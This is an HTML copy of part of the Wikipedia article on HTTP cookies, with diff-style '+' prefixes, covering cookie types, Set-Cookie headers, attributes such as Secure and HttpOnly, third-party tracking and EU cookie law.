+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=2.php.html" title="Edit section: Terminology">edit</a>]</span> <span class="mw-headline" id="Terminology">Terminology</span></h2>
+<table class="metadata plainlinks ambox ambox-content ambox-Refimprove" style="">
+<tr>
+<td class="mbox-image">
+<div style="width: 52px;"><img alt="" src="http://upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/50px-Question_book-new.svg.png" width="50" height="39" srcset="//upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/75px-Question_book-new.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/9/99/Question_book-new.svg/100px-Question_book-new.svg.png 2x" /></div>
+</td>
+<td class="mbox-text" style=""><span class="mbox-text-span">This section <b>needs additional citations for verification</b>. <span class="hide-when-compact">Please help <a class="external text" href="../../w/index-title=HTTP_cookie&action=edit.php.html">improve this article</a> by <a href="Help_Introduction_to_referencing/1" title="Help:Introduction to referencing/1">adding citations to reliable sources</a>. Unsourced material may be <a href="Template_Citation_needed" title="Template:Citation needed">challenged</a> and <a href="Wikipedia_Verifiability#Burden_of_evidence" title="Wikipedia:Verifiability">removed</a>.</span> <small><i>(August 2011)</i></small> </span></td>
+</tr>
+</table>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=3.php.html" title="Edit section: Session cookie">edit</a>]</span> <span class="mw-headline" id="Session_cookie">Session cookie</span></h3>
+<p>A user's session cookie<sup id="cite_ref-mscookie_13-0" class="reference"><a href="#cite_note-mscookie-13"><span>[</span>13<span>]</span></a></sup> (also known as an in-memory cookie or transient cookie) for a website exists in temporary memory only while the user is reading and navigating the website. When <a href="index.html#Expires_and_Max-Age" title="HTTP cookie">an expiry date or validity interval</a> is not set at cookie creation time, a session cookie is created. Web browsers normally delete session cookies when the user closes the browser.<sup id="cite_ref-14" class="reference"><a href="#cite_note-14"><span>[</span>14<span>]</span></a></sup><sup id="cite_ref-15" class="reference"><a href="#cite_note-15"><span>[</span>15<span>]</span></a></sup></p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=4.php.html" title="Edit section: Persistent cookie">edit</a>]</span> <span class="mw-headline" id="Persistent_cookie">Persistent cookie</span></h3>
+<p>A persistent cookie<sup id="cite_ref-mscookie_13-1" class="reference"><a href="#cite_note-mscookie-13"><span>[</span>13<span>]</span></a></sup> will outlast user sessions. If a persistent cookie has its Max-Age set to 1 year, then, within the year, the initial value set in that cookie would be sent back to the server every time the user visited the server. This could be used to record a vital piece of information such as how the user initially came to this website. For this reason persistent cookies are also called tracking cookies.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=5.php.html" title="Edit section: Secure cookie">edit</a>]</span> <span class="mw-headline" id="Secure_cookie">Secure cookie</span></h3>
+<p>A secure cookie has the <a href="#Secure_and_HttpOnly">secure attribute</a> enabled and is only used via <a href="HTTP_Secure" title="HTTP Secure">HTTPS</a>, ensuring that the cookie is always encrypted when transmitting from client to server. This makes the cookie less likely to be exposed to cookie theft via eavesdropping.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=6.php.html" title="Edit section: HttpOnly cookie">edit</a>]</span> <span class="mw-headline" id="HttpOnly_cookie">HttpOnly cookie</span></h3>
+<p>The HttpOnly cookie is supported by most modern browsers.<sup id="cite_ref-httponlybrowsers_16-0" class="reference"><a href="#cite_note-httponlybrowsers-16"><span>[</span>16<span>]</span></a></sup><sup id="cite_ref-httponlyrfc_17-0" class="reference"><a href="#cite_note-httponlyrfc-17"><span>[</span>17<span>]</span></a></sup> On a supported browser, an HttpOnly session cookie will be used only when transmitting HTTP (or HTTPS) requests, thus restricting access from other, non-HTTP APIs (such as JavaScript). This restriction mitigates but does not eliminate the threat of session cookie theft via <a href="Cross-site_scripting" title="Cross-site scripting">cross-site scripting</a> (XSS).<sup id="cite_ref-httponlyprotection_18-0" class="reference"><a href="#cite_note-httponlyprotection-18"><span>[</span>18<span>]</span></a></sup> This feature applies only to session-management cookies, and not other browser cookies.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=7.php.html" title="Edit section: Third-party cookie">edit</a>]</span> <span class="mw-headline" id="Third-party_cookie">Third-party cookie</span></h3>
+<p>First-party cookies are cookies set with the same domain (or its subdomain) as your browser's address bar. Third-party cookies are cookies set with domains different from the one shown on the address bar. The web pages on the first domain may feature content from a third-party domain, e.g. a banner advert run by <code>www.advexample.com</code>. Privacy setting options in most modern browsers allow you to block third-party tracking cookies.</p>
+<p>As an example, suppose a user visits <code>www.example1.com</code>, which includes an advert which sets a cookie with the domain <code>ad.foxytracking.com</code>. When the user later visits <code>www.example2.com</code>, another advert can set another cookie with the domain <code>ad.foxytracking.com</code>. Eventually, both of these cookies will be sent to the advertiser when loading their ads or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites this advertiser has footprints on.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=8.php.html" title="Edit section: Supercookie">edit</a>]</span> <span class="mw-headline" id="Supercookie">Supercookie</span></h3>
+<p>A "supercookie" is a cookie with a public suffix domain, like <code>.com</code>, <code>.co.uk</code> or <code>k12.ca.us</code>.<sup id="cite_ref-publicsuffix_19-0" class="reference"><a href="#cite_note-publicsuffix-19"><span>[</span>19<span>]</span></a></sup></p>
+<p>Most browsers, by default, allow first-party cookies—a cookie with domain to be the same or sub-domain of the requesting host. For example, a user visiting <code>www.example.com</code> can have a cookie set with domain <code>www.example.com</code> or <code>.example.com</code>, but not <code>.co.uk</code>.<sup id="cite_ref-bug252342_20-0" class="reference"><a href="#cite_note-bug252342-20"><span>[</span>20<span>]</span></a></sup> A supercookie with domain <code>.com</code> would be blocked by browsers; otherwise, a malicious website, like <code>attacker.com</code>, could set a supercookie with domain <code>.com</code> and potentially disrupt or impersonate legitimate user requests to <code>example.com</code>. The <a href="Public_Suffix_List" title="Public Suffix List">Public Suffix List</a> is a cross-vendor initiative to provide an accurate list of domain name suffixes changing.<sup id="cite_ref-21" class="reference"><a href="#cite_note-21"><span>[</span>21<span>]</span></a></sup> Older versions of browsers may not have the most up-to-date list, and will therefore be vulnerable to certain supercookies.</p>
+<p>The term "supercookies" is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such "supercookie" mechanisms were found on Microsoft websites: cookie syncing that respawned MUID cookies, and <a href="HTTP_ETag" title="HTTP ETag">ETag</a> cookies.<sup id="cite_ref-22" class="reference"><a href="#cite_note-22"><span>[</span>22<span>]</span></a></sup> Due to media attention, Microsoft later disabled this code:</p>
+<blockquote class="templatequote">
+<div class="Bug6200">In response to recent attention on "supercookies" in the media, we wanted to share more detail on the immediate action we took to address this issue, as well as affirm our commitment to the privacy of our customers. According to researchers, including Jonathan Mayer at Stanford University, "supercookies" are capable of re-creating users' cookies or other identifiers after people deleted regular cookies. Mr. Mayer identified Microsoft as one among others that had this code, and when he brought his findings to our attention we promptly investigated. We determined that the cookie behavior he observed was occurring under certain circumstances as a result of older code that was used only on our own sites, and was already scheduled to be discontinued. We accelerated this process and quickly disabled this code. At no time did this functionality cause Microsoft cookie identifiers or data associated with those identifiers to be shared outside of Microsoft.</div>
+<div class="templatequotecite">—Mike Hintze<sup id="cite_ref-23" class="reference"><a href="#cite_note-23"><span>[</span>23<span>]</span></a></sup></div>
+</blockquote>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=9.php.html" title="Edit section: Zombie cookie">edit</a>]</span> <span class="mw-headline" id="Zombie_cookie">Zombie cookie</span></h3>
+<div class="rellink relarticle mainarticle">Main articles: <a href="Zombie_cookie" title="Zombie cookie">Zombie cookie</a> and <a href="Evercookie" title="Evercookie">Evercookie</a></div>
+<p>Some cookies are automatically recreated after a user has deleted them; these are called <i>zombie cookies</i>. This is accomplished by a script storing the content of the cookie in some other locations, such as the <a href="Adobe_Flash_Player#Privacy" title="Adobe Flash Player">local storage available to Flash content</a>, HTML5 storages and other client side mechanisms, and then recreating the cookie from backup stores when the cookie's absence is detected.</p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=10.php.html" title="Edit section: Uses">edit</a>]</span> <span class="mw-headline" id="Uses">Uses</span></h2>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=11.php.html" title="Edit section: Session management">edit</a>]</span> <span class="mw-headline" id="Session_management">Session management</span></h3>
+<p>Cookies may be used to maintain data related to the user during navigation, possibly across multiple visits. Cookies were introduced to provide a way to implement a "<a href="Shopping_cart_software" title="Shopping cart software">shopping cart</a>" (or "shopping basket"),<sup id="cite_ref-ks_7-1" class="reference"><a href="#cite_note-ks-7"><span>[</span>7<span>]</span></a></sup><sup id="cite_ref-kristol_8-1" class="reference"><a href="#cite_note-kristol-8"><span>[</span>8<span>]</span></a></sup> a virtual device into which users can store items they want to purchase as they navigate throughout the site.</p>
+<p>Shopping basket applications today usually store the list of basket contents in a database on the server side, rather than storing basket items in the cookie itself. A web server typically sends a cookie containing a <a href="Unique_identifier" title="Unique identifier">unique session identifier</a>. The web browser will send back that session identifier with each subsequent request and shopping basket items are stored associated with a unique session identifier.</p>
+<p>Allowing users to log in to a website is a frequent use of cookies. Typically the web server will first send a cookie containing a unique session identifier. Users then submit their credentials and the web application authenticates the session and allows the user access to services.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=12.php.html" title="Edit section: Personalization">edit</a>]</span> <span class="mw-headline" id="Personalization">Personalization</span></h3>
+<p>Cookies may be used to remember the information about the user who has visited a website in order to show relevant content in the future. For example a web server may send a cookie containing the username last used to log in to a website so that it may be filled in for future visits.</p>
+<p>Many websites use cookies for <a href="Personalization" title="Personalization">personalization</a> based on users' preferences. Users select their preferences by entering them in a web form and submitting the form to the server. The server encodes the preferences in a cookie and sends the cookie back to the browser. This way, every time the user accesses a page, the server is also sent the cookie where the preferences are stored, and can personalize the page according to the user preferences. For example, the <a href="Wikipedia" title="Wikipedia">Wikipedia</a> website allows authenticated users to choose the webpage <a href="Skin_(computing)" title="Skin (computing)">skin</a> they like best; the <a href="Google" title="Google">Google</a> search engine once allowed users (even non-registered ones) to decide how many search results per page they want to see.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=13.php.html" title="Edit section: Tracking">edit</a>]</span> <span class="mw-headline" id="Tracking">Tracking</span></h3>
+<p>Tracking cookies may be used to track internet users' web browsing. This can also be done in part by using the <a href="IP_address" title="IP address">IP address</a> of the computer requesting the page or the <a href="HTTP_referrer" title="HTTP referrer" class="mw-redirect">referrer</a> field of the <a href="HyperText_Transfer_Protocol" title="HyperText Transfer Protocol" class="mw-redirect">HTTP request header</a>, but cookies allow for greater precision. This can be demonstrated as follows:</p>
+<ol>
+<li>If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user; the server creates a random string and sends it as a cookie back to the browser together with the requested page;</li>
+<li>From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested; the server sends the page as usual, but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file.</li>
+</ol>
+<p>By analyzing the log file collected in the process, it is then possible to find out which pages the user has visited, in what sequence, and for how long.</p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=14.php.html" title="Edit section: Implementation">edit</a>]</span> <span class="mw-headline" id="Implementation">Implementation</span></h2>
+<div class="thumb tright">
+<div class="thumbinner" style="width:222px;"><a href="http://en.wikipedia.org/wiki/File:HTTP_cookie_exchange.svg" class="image"><img alt="" src="http://upload.wikimedia.org/wikipedia/commons/thumb/b/bc/HTTP_cookie_exchange.svg/220px-HTTP_cookie_exchange.svg.png" width="220" height="123" class="thumbimage" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/b/bc/HTTP_cookie_exchange.svg/330px-HTTP_cookie_exchange.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/bc/HTTP_cookie_exchange.svg/440px-HTTP_cookie_exchange.svg.png 2x" /></a>
+<div class="thumbcaption">
+<div class="magnify"><a href="http://en.wikipedia.org/wiki/File:HTTP_cookie_exchange.svg" class="internal" title="Enlarge"><img src="http://bits.wikimedia.org/static-1.21wmf9/skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>
+A possible interaction between a Web browser and a server holding a Web page in which the server sends a cookie to the browser and the browser sends it back when requesting another page.</div>
+</div>
+</div>
+<p>Cookies are arbitrary pieces of data chosen by the <a href="Web_server" title="Web server">Web server</a> and sent to the browser. The browser returns them unchanged to the server, introducing a <a href="State_(computer_science)" title="State (computer science)">state</a> (memory of previous events) into otherwise stateless HTTP transactions. Without cookies, each retrieval of a <a href="Web_page" title="Web page">Web page</a> or component of a Web page is an isolated event, mostly unrelated to all other views of the pages of the same site. Other than being set by a web server, cookies can also be set by a <a href="Scripting_programming_language" title="Scripting programming language" class="mw-redirect">script</a> in a language such as <a href="JavaScript" title="JavaScript">JavaScript</a>, if supported and enabled by the Web browser.</p>
+<p>Cookie specifications<sup id="cite_ref-httponlyrfc_17-1" class="reference"><a href="#cite_note-httponlyrfc-17"><span>[</span>17<span>]</span></a></sup><sup id="cite_ref-24" class="reference"><a href="#cite_note-24"><span>[</span>24<span>]</span></a></sup><sup id="cite_ref-25" class="reference"><a href="#cite_note-25"><span>[</span>25<span>]</span></a></sup> suggest that browsers should be able to save and send back a minimal number of cookies. In particular, a web browser is expected to be able to store at least 300 cookies of four <a href="Kilobyte" title="Kilobyte">kilobytes</a> each, and at least 20 cookies per server or <a href="Internet_domain" title="Internet domain" class="mw-redirect">domain</a>.</p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=15.php.html" title="Edit section: Setting a cookie">edit</a>]</span> <span class="mw-headline" id="Setting_a_cookie">Setting a cookie</span></h3>
+<p>Transfer of Web pages follows the <a href="HyperText_Transfer_Protocol" title="HyperText Transfer Protocol" class="mw-redirect">HyperText Transfer Protocol</a> (HTTP). Regardless of cookies, browsers request a page from web servers by sending them a usually short text called <a href="HyperText_Transfer_Protocol" title="HyperText Transfer Protocol" class="mw-redirect">HTTP request</a>. For example, to access the page http://www.example.org/index.html, browsers connect to the server www.example.org sending it a request that looks like the following one:</p>
+<table>
+<tr>
+<td></td>
+<td>
+<div style="border:solid thin; padding:0 1em;">
+<p><tt>GET /index.html HTTP/1.1<br />
+Host: www.example.org<br />
+<br /></tt></p>
+</div>
+</td>
+<td></td>
+</tr>
+<tr>
+<td><b>browser</b></td>
+<td>
+<center>-------→</center>
+</td>
+<td><b>server</b></td>
+</tr>
+</table>
+<p>The server replies by sending the requested page preceded by a similar packet of text, called <a href="HyperText_Transfer_Protocol" title="HyperText Transfer Protocol" class="mw-redirect">'HTTP response'</a>. This packet may contain lines requesting the browser to store cookies:</p>
+<table>
+<tr>
+<td></td>
+<td>
+<div style="border:solid thin; padding:0 1em;">
+<p><tt>HTTP/1.1 200 OK<br />
+Content-type: text/html<br />
+<span style="color:green;">Set-Cookie: name=value</span><br />
+<span style="color:green;">Set-Cookie: name2=value2; Expires=Wed, 09-Jun-2021 10:18:14 GMT</span><br />
+&#160;<br />
+(content of page)</tt></p>
+</div>
+</td>
+<td></td>
+</tr>
+<tr>
+<td><b>browser</b></td>
+<td>
+<center>←-------</center>
+</td>
+<td><b>server</b></td>
+</tr>
+</table>
+<p>The server sends lines of <code>Set-Cookie</code> only if the server wishes the browser to store cookies. <code>Set-Cookie</code> is a directive for the browser to store the cookie and send it back in future requests to the server (subject to expiration time or other <a href="index.html#Cookie_attributes" title="HTTP Cookie" class="mw-redirect">cookie attributes</a>), if the browser supports cookies and cookies are enabled. For example, the browser requests the page http://www.example.org/spec.html by sending the server www.example.org a request like the following:</p>
+<table>
+<tr>
+<td></td>
+<td>
+<div style="border:solid thin; padding:0 1em;">
+<p><tt>GET /spec.html HTTP/1.1<br />
+Host: www.example.org<br />
+<span style="color:green;">Cookie: name=value; name2=value2</span><br />
+Accept: */*<br />
+&#160;<br /></tt></p>
+</div>
+</td>
+<td></td>
+</tr>
+<tr>
+<td><b>browser</b></td>
+<td>
+<center>-------→</center>
+</td>
+<td><b>server</b></td>
+</tr>
+</table>
+<p>This is a request for another page from the same server, and differs from the first one above because it contains the string that the server has previously sent to the browser. This way, the server knows that this request is related to the previous one. The server answers by sending the requested page, possibly adding other cookies as well.</p>
+<p>The value of a cookie can be modified by the server by sending a new <code>Set-Cookie: name=newvalue</code> line in response of a page request. The browser then replaces the old value with the new one.</p>
+<p>The value of a cookie may consist of any printable ascii character (<code>!</code> through <code>~</code>, unicode <code>\u0021</code> through <code>\u007E</code>) excluding <code>,</code> and <code>;</code> and excluding whitespace. The name of the cookie also excludes <code>=</code> as that is the delimiter between the name and value. The cookie standard RFC2965 is more limiting but not implemented by browsers.</p>
+<p>The term "cookie crumb" is sometimes used to refer to the name-value pair.<sup id="cite_ref-CrumbExample_26-0" class="reference"><a href="#cite_note-CrumbExample-26"><span>[</span>26<span>]</span></a></sup> This is not the same as <a href="Breadcrumb_(navigation)" title="Breadcrumb (navigation)">breadcrumb web navigation</a>, which is the technique of showing in each page the list of pages the user has previously visited; this technique, however, may be implemented using cookies.</p>
+<p>Cookies can also be set by JavaScript or similar scripts running within the browser. In JavaScript, the object <code>document.cookie</code> is used for this purpose. For example, the instruction <code>document.cookie = "temperature=20"</code> creates a cookie of name <code>temperature</code> and value <code>20</code>.<sup id="cite_ref-27" class="reference"><a href="#cite_note-27"><span>[</span>27<span>]</span></a></sup></p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=16.php.html" title="Edit section: Cookie attributes">edit</a>]</span> <span class="mw-headline" id="Cookie_attributes">Cookie attributes</span></h3>
+<p>Besides the name–value pair, servers can also set these cookie attributes: a cookie domain, a path, expiration time or maximum age, Secure flag and HttpOnly flag. Browsers will not send cookie attributes back to the server. They will only send the cookie’s name-value pair. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie (name-value pair) to the servers.</p>
+<h4><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=17.php.html" title="Edit section: Domain and Path">edit</a>]</span> <span class="mw-headline" id="Domain_and_Path">Domain and Path</span></h4>
+<p>The cookie domain and path define the scope of the cookie—they tell the browser that cookies should only be sent back to the server for the given domain and path. If not specified, they default to the domain and path of the object that was requested. An example of Set-Cookie directives from a website after a user logged in:</p>
+<table>
+<tr>
+<td></td>
+<td>
+<div style="border:solid thin; padding:0 1em;">
+<p><tt>Set-Cookie: LSID=DQAAAK…Eaem_vYg; <span style="color:green;">Domain=docs.foo.com; Path=/accounts;</span> Expires=Wed, 13-Jan-2021 22:23:01 GMT; Secure; HttpOnly<br />
+Set-Cookie: HSID=AYQEVn….DKrdst; <span style="color:green;">Domain=.foo.com; Path=/;</span> Expires=Wed, 13-Jan-2021 22:23:01 GMT; HttpOnly<br />
+Set-Cookie: SSID=Ap4P….GTEq; <span style="color:green;">Domain=.foo.com; Path=/;</span> Expires=Wed, 13-Jan-2021 22:23:01 GMT; Secure; HttpOnly<br />
+&#160;......<br /></tt></p>
+</div>
+</td>
+</tr>
+</table>
+<p>The first cookie <code>LSID</code> has default domain <code>docs.foo.com</code> and Path <code>/accounts</code>, which tells the browser to use the cookie only when requesting pages contained in <code>docs.foo.com/accounts</code>. The other 2 cookies <code>HSID</code> and <code>SSID</code> would be sent back by the browser while requesting any subdomain in <code>.foo.com</code> on any path, for example <code>www.foo.com/</code>.</p>
+<p>Cookies can only be set on the top domain and its sub domains. Setting cookies on <code>www.foo.com</code> from <code>www.bar.com</code> will not work for security reasons.<sup id="cite_ref-Sharing_Cookies_Between_Multiple_Domains_28-0" class="reference"><a href="#cite_note-Sharing_Cookies_Between_Multiple_Domains-28"><span>[</span>28<span>]</span></a></sup></p>
+<h4><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=18.php.html" title="Edit section: Expires and Max-Age">edit</a>]</span> <span class="mw-headline" id="Expires_and_Max-Age">Expires and Max-Age</span></h4>
+<p>The Expires directive tells the browser when to delete the cookie. Derived from the format used in <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc1123">RFC 1123</a>, the date is specified in the form of “Wdy, DD Mon YYYY HH:MM:SS GMT”,<sup id="cite_ref-29" class="reference"><a href="#cite_note-29"><span>[</span>29<span>]</span></a></sup> indicating the exact date/time this cookie will expire. As an alternative to setting cookie expiration as an absolute date/time, <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc6265">RFC 6265</a> allows the use of the Max-Age attribute to set the cookie’s expiration as an interval of seconds in the future, relative to the time the browser received the cookie. An example of Set-Cookie directives from a website after a user logged in:</p>
+<table>
+<tr>
+<td></td>
+<td>
+<div style="border:solid thin; padding:0 1em;">
+<p><tt>Set-Cookie: lu=Rg3vHJZnehYLjVg7qi3bZjzg; <span style="color:green;">Expires=Tue, 15-Jan-2013 21:47:38 GMT;</span> Path=/; Domain=.foo.com; HttpOnly<br />
+Set-Cookie: made_write_conn=1295214458; Path=/; Domain=.foo.com<br />
+Set-Cookie: reg_fb_gate=deleted; <span style="color:green;">Expires=Thu, 01-Jan-1970 00:00:01 GMT;</span> Path=/; Domain=.foo.com; HttpOnly<br />
+&#160;......<br /></tt></p>
+</div>
+</td>
+</tr>
+</table>
+<p>The first cookie <code>lu</code> is set to expire sometime in 15-Jan-2013; it will be used by the client browser until that time. The second cookie <code>made_write_conn</code> does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie <code>reg_fb_gate</code> has its value changed to <i>deleted</i>, with an expiration time in the past. The browser will delete this cookie right away – note that cookie will only be deleted when the domain and path attributes in the <code>Set-Cookie</code> field match the values used when the cookie was created.</p>
+<h4><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=19.php.html" title="Edit section: Secure and HttpOnly">edit</a>]</span> <span class="mw-headline" id="Secure_and_HttpOnly">Secure and HttpOnly</span></h4>
+<p>The Secure and HttpOnly attributes do not have associated values. Rather, the presence of the attribute names indicates that the Secure and HttpOnly behaviors are specified.</p>
+<p>The Secure attribute is meant to keep cookie communication limited to encrypted transmission, directing browsers to use cookies only via <a href="Https" title="Https" class="mw-redirect">secure/encrypted</a> connections. Naturally, web servers should <i>set</i> Secure cookies via <a href="Https" title="Https" class="mw-redirect">secure/encrypted</a> connections, lest the cookie information be <a href="Cleartext" title="Cleartext" class="mw-redirect">transmitted in a way that allows eavesdropping</a> when first sent to the web browser.</p>
+<p>The HttpOnly attribute directs browsers to use cookies via the HTTP protocol only. (This includes HTTPS; HttpOnly is not the opposite of Secure.) An HttpOnly cookie is not accessible via non-HTTP methods, such as calls via JavaScript (e.g., referencing "document.cookie"), and therefore cannot be stolen easily via <a href="Cross-site_scripting" title="Cross-site scripting">cross-site scripting</a> (a pervasive attack technique<sup id="cite_ref-Symantec-2007-2nd-exec_30-0" class="reference"><a href="#cite_note-Symantec-2007-2nd-exec-30"><span>[</span>30<span>]</span></a></sup>).</p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=20.php.html" title="Edit section: Browser settings">edit</a>]</span> <span class="mw-headline" id="Browser_settings">Browser settings</span></h2>
+<p>Most modern browsers support cookies and allow the user to disable them. The following are common options:<sup id="cite_ref-31" class="reference"><a href="#cite_note-31"><span>[</span>31<span>]</span></a></sup></p>
+<ol>
+<li>To enable or disable cookies completely, so that they are always accepted or always blocked.</li>
+<li>Some browsers incorporate a cookie manager for the user to see and selectively delete the cookies currently stored in the browser.</li>
+<li>By default, Internet Explorer allows only third-party cookies that are accompanied by a <a href="P3P" title="P3P">P3P</a> "CP" (Compact Policy) field.<sup id="cite_ref-32" class="reference"><a href="#cite_note-32"><span>[</span>32<span>]</span></a></sup></li>
+</ol>
+<p>Most browsers also allow a full wipe of private data including cookies. Add-on tools for managing cookie permissions also exist.<sup id="cite_ref-microsoft2007_33-0" class="reference"><a href="#cite_note-microsoft2007-33"><span>[</span>33<span>]</span></a></sup><sup id="cite_ref-34" class="reference"><a href="#cite_note-34"><span>[</span>34<span>]</span></a></sup><sup id="cite_ref-35" class="reference"><a href="#cite_note-35"><span>[</span>35<span>]</span></a></sup><sup id="cite_ref-36" class="reference"><a href="#cite_note-36"><span>[</span>36<span>]</span></a></sup></p>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=21.php.html" title="Edit section: Privacy and third-party cookies">edit</a>]</span> <span class="mw-headline" id="Privacy_and_third-party_cookies">Privacy and third-party cookies</span></h2>
+<div class="rellink boilerplate seealso">See also: <a href="Do_Not_Track" title="Do Not Track">Do Not Track</a>&#160;and <a href="Web_analytics#Problems_with_cookies" title="Web analytics">Web analytics: Problems with cookies</a></div>
+<p>Cookies have some important implications on the <a href="Privacy" title="Privacy">privacy</a> and <a href="Anonymity" title="Anonymity">anonymity</a> of Web users. While cookies are sent only to the server setting them or the server in the same <a href="Internet_domain" title="Internet domain" class="mw-redirect">Internet domain</a>, a Web page may contain images or other components stored on servers in other domains. Cookies that are set during retrieval of these components are called <i>third-party cookies</i>. The standards for cookies, <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2109">RFC 2109</a> and <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2965">RFC 2965</a>, specify that browsers should protect user privacy and not allow third-party cookies by default. But most browsers, such as <a href="Mozilla_Firefox" title="Mozilla Firefox" class="mw-redirect">Mozilla Firefox</a>, <a href="Internet_Explorer" title="Internet Explorer">Internet Explorer</a>, <a href="Opera_(web_browser)" title="Opera (web browser)">Opera</a> and <a href="Google_Chrome" title="Google Chrome">Google Chrome</a> do allow third-party cookies by default, as long as the third-party website has <a href="P3P" title="P3P">Compact Privacy Policy</a> published.</p>
+<div class="thumb tright">
+<div class="thumbinner" style="width:222px;"><a href="http://en.wikipedia.org/wiki/File:Third_party_cookie.svg" class="image"><img alt="" src="http://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Third_party_cookie.svg/220px-Third_party_cookie.svg.png" width="220" height="152" class="thumbimage" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/5/50/Third_party_cookie.svg/330px-Third_party_cookie.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/5/50/Third_party_cookie.svg/440px-Third_party_cookie.svg.png 2x" /></a>
+<div class="thumbcaption">
+<div class="magnify"><a href="http://en.wikipedia.org/wiki/File:Third_party_cookie.svg" class="internal" title="Enlarge"><img src="http://bits.wikimedia.org/static-1.21wmf9/skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>
+In this fictional example, an advertising company has placed banners in two websites. Hosting the banner images on its servers and using third-party cookies, the advertising company is able to track the browsing of users across these two sites.</div>
+</div>
+</div>
+<p>Advertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or <a href="Web_bug" title="Web bug">web bugs</a>. Knowledge of the pages visited by a user allows the advertising company to target advertisements to the user's presumed preferences.</p>
+<p>Website operators who do not disclose third-party cookie use to consumers run the risk of harming consumer trust if cookie use is discovered. Having clear disclosure (such as in a <a href="Privacy_policy" title="Privacy policy">privacy policy</a>) tends to eliminate any negative effects of such cookie discovery.<sup id="cite_ref-37" class="reference"><a href="#cite_note-37"><span>[</span>37<span>]</span></a></sup></p>
+<p>The possibility of building a profile of users is considered by some a potential privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.</p>
+<p>The <a href="United_States" title="United States">United States</a> government has set strict rules on setting cookies in 2000 after it was disclosed that the White House <a href="Office_of_National_Drug_Control_Policy" title="Office of National Drug Control Policy">drug policy office</a> used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the <a href="Central_Intelligence_Agency" title="Central Intelligence Agency">CIA</a> had been leaving persistent cookies on computers which had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them.<sup id="cite_ref-38" class="reference"><a href="#cite_note-38"><span>[</span>38<span>]</span></a></sup> On December 25, 2005, Brandt discovered that the <a href="National_Security_Agency" title="National Security Agency">National Security Agency</a> (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the National Security Agency immediately disabled the cookies.<sup id="cite_ref-39" class="reference"><a href="#cite_note-39"><span>[</span>39<span>]</span></a></sup></p>
+<h3><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=22.php.html" title="Edit section: EU Cookie Law">edit</a>]</span> <span class="mw-headline" id="EU_Cookie_Law">EU Cookie Law</span></h3>
+<div class="rellink boilerplate seealso">See also: <a href="Do_Not_Track_Policy" title="Do Not Track Policy">Do Not Track Policy</a></div>
+<p>In 2002, the European Union launched the <a href="Directive_on_Privacy_and_Electronic_Communications" title="Directive on Privacy and Electronic Communications">Directive on Privacy and Electronic Communications</a>, a policy requiring end users’ consent for the placement of cookies, and similar technologies for storing and accessing information on users’ equipment.<sup id="cite_ref-JISC_40-0" class="reference"><a href="#cite_note-JISC-40"><span>[</span>40<span>]</span></a></sup><sup id="cite_ref-ICO_reference_41-0" class="reference"><a href="#cite_note-ICO_reference-41"><span>[</span>41<span>]</span></a></sup> In particular, Article 5 Paragraph 3 mandates that storing data in a user’s computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storing operation.</p>
